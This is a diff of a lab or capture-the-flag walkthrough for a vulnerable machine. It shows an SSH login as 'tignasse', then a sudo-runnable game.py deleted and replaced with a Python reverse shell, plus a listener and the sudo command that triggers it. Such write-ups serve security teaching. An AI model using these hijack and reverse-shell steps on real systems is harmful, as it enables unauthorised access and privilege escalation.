@@ -173,7 +173,7 @@ more .pass.txt
 ```
 *NB: The difference in output is due to the presence of some characters that are interpreted differently by cat and more*.
 
-We can use this password to log in as tignasse through SSH.
+We can use this password to log in as tignasse using SSH.
 ```bash
 ┌──(pentester㉿kali)-[~/Suuk]
 └─$ssh tignasse@10.0.2.13                                                     
@@ -183,6 +183,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 tignasse@kuus:~$ 
 ```
+
 ## Post Exploitation
 At this point in our assessment, we have successfully obtained an SSH session as a local user on the target. Let's use this user to perform lateral movement and privilege escalation. When we look at this user's sudo right we see that the user tignasse can run a Python game located in the /opt/game directory as mister_b.
 ```bash
@@ -221,12 +222,14 @@ while (1 < 2):
     else:       
         print "You win!"
 ```
+
 From the result above we see that the user input accepted by the game is not used in any execution hence we can forget the idea of a command execution vulnerability. What is interesting is that the directory **game** belongs to our user's group and we have written permission on this directory. This means we can add or delete files in this directory.<br> *NB: In a real-world assessment avoid deleting clients' files or folders instead you can make a backup of these files before deleting them*.<br> We can copy the original game to the /tmp directory and add a fake file with  the same name but with a reverse shell in it.
 ```bash
 tignasse@kuus:/opt/games$ cp game.py /tmp
 tignasse@kuus:/opt/games$ rm game.py
 rm: remove write-protected regular file 'game.py'? y
 ```
+
 We can add the following Python code to our fake game.py file.
 ```python
 import socket,subprocess,os
@@ -248,7 +251,6 @@ listening on [any] 1235 ...
 ```bash
 tignasse@kuus:/opt/games$ nano game.py 
 tignasse@kuus:/opt/games$ sudo -u mister_b /usr/bin/python /opt/games/game.py
-
 ```
 
 We can go back to our listener and we shall see a reverse connection established by the target. We can use this access to read the user flag as shown below.
@@ -352,10 +354,3 @@ Great, this tool works and has granted us root access. We can use this access to
 
 ## Conclusion
 Congratulations! In this walkthrough, you have learned to bypass some common filters used in upload forms to achieve insecure file upload. Also, you have learned how to hijack files that can be executed with sudo privileges to achieve lateral movement. This machine was designed to show how improper handling of file extensions in upload forms and misconfiguration of web servers can seriously impact the security posture of an organisation. Thank you for following up on this walkthrough.
-
-
-
-
-
-
-
